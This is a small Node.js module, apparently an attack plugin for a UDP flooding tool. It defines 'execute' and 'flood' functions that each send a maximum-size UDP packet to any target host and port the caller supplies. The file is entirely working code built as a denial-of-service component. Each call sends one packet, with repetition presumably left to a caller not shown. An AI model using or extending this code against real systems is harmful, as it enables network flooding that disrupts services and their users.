const dgram = require('dgram');

module.exports = {
    name: 'Large UDP Packet',
    description: 'Sends oversized UDP packets',
    
    execute: async (target, port) => {
        const socket = dgram.createSocket('udp4');
        const message = Buffer.alloc(65507); // Max UDP size
        
        return new Promise((resolve, reject) => {
            socket.send(message, port, target, (err) => {
                if (err) reject(err);
                else resolve({ sent: true, size: message.length });
                socket.close();
            });
        });
    },
    
    flood: (target, port, callback) => {
        const socket = dgram.createSocket('udp4');
        const message = Buffer.alloc(65507);
        
        socket.send(message, port, target, (err) => {
            socket.close();
            callback(!err);
        });
    }
};